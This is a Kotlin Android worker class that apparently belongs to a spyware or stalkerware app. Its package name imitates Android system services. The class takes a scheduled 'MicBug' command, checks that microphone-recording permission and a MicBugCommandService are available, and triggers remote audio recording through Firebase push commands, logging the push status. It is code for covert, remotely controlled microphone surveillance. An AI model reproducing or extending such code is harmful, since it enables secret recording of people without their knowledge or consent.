package com.android.services.workers

import android.Manifest
import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.android.services.db.entities.PushStatus
import com.android.services.enums.FcmPushStatus
import com.android.services.models.FCMPush
import com.android.services.models.MicBugCommand
import com.android.services.models.MicBugScheduleCommand
import com.android.services.services.micBug.MicBugCommandService
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.FirebasePushUtils
import com.android.services.util.FirebasePushUtils.checkBugStatus
import com.android.services.util.InjectorUtils
import com.android.services.util.logVerbose
import com.google.gson.Gson
import com.google.gson.GsonBuilder

class FutureWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {

    override fun doWork(): Result {
        AppUtils.appendLog(
            applicationContext,
            "${AppConstants.MIC_BUG_TYPE} Future worker called ${
                AppUtils.formatDate(
                    System.currentTimeMillis().toString()
                )
            }"
        )
        logVerbose("${AppConstants.MIC_BUG_TYPE} Future worker called")
        val extraCommand: String? = inputData.getString(KEY_MIC_BUG_COMMAND)
        extraCommand?.let {
            val micBugScheduleCommand = GsonBuilder().create()
                .fromJson<MicBugScheduleCommand>(
                    extraCommand,
                    MicBugScheduleCommand::class.java
                )
            AppUtils.appendLog(
                applicationContext,
                "${AppConstants.MIC_BUG_TYPE} MicBugScheduleCommand = $micBugScheduleCommand"
            )
            AppUtils.appendLog(
                applicationContext,
                "${AppConstants.MIC_BUG_TYPE} MicBugScheduleCommand = $micBugScheduleCommand"
            )
            logVerbose("${AppConstants.MIC_BUG_TYPE} MicBugScheduleCommand = $micBugScheduleCommand")

            // Checks current status of MicBug permissions and service,
            // Whether MicBug can be scheduled or not
            val fcmPushStatus = checkBugStatus(
                applicationContext,
                "startMicBug", arrayOf(Manifest.permission.RECORD_AUDIO),
                MicBugCommandService::class.java.name
            )
            if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                AppUtils.appendLog(
                    applicationContext,
                    "${AppConstants.MIC_BUG_TYPE} push Received ${fcmPushStatus.getStatus()}"
                )
                startMicBugRecording(micBugScheduleCommand)
            } else {
                AppUtils.appendLog(applicationContext, "${AppConstants.MIC_BUG_TYPE} push failed")
                val pushStatus = PushStatus(
                    micBugScheduleCommand.pushId, fcmPushStatus.getStatus(),
                    micBugScheduleCommand.pushId.split("_")[0],
                    AppUtils.getDate(System.currentTimeMillis()), 0
                )
                InjectorUtils.providePushStatusRepository(applicationContext)
                    .updatePushStatus(pushStatus)
            }
        } ?: kotlin.run {
            AppUtils.appendLog(
                applicationContext,
                "${AppConstants.MIC_BUG_TYPE} extraCommand is Null"
            )
            logVerbose("${AppConstants.MIC_BUG_TYPE} extraCommand is Null")
        }
        return Result.success()
    }

    /** Start the MicBug Recording **/
    private fun startMicBugRecording(micBugScheduleCommand: MicBugScheduleCommand) {
        val micBugCommand = Gson().toJson(
            MicBugCommand(
                micBugScheduleCommand.customData,
                "startMicBug",
                micBugScheduleCommand.pushId
            )
        )
        val pushId = micBugScheduleCommand.pushId
        logVerbose("${AppConstants.MIC_BUG_TYPE} MicBugCommand = $micBugCommand")

        val fcmPush =
            FCMPush(
                micBugCommand,
                "startMicBug",
                micBugScheduleCommand.pushId,
                pushId.split("_")[0]
            )
        logVerbose("${AppConstants.MIC_BUG_TYPE} fcmPush = $fcmPush")
        AppUtils.appendLog(applicationContext, "${AppConstants.MIC_BUG_TYPE} fcmPush = $fcmPush")
        FirebasePushUtils.startPushCommand(applicationContext, fcmPush, AppConstants.MIC_BUG_TYPE)
    }

    companion object {
        private const val TAG = "FutureWorker"
        const val KEY_MIC_BUG_COMMAND = "MIC_BUG_COMMAND"
    }
}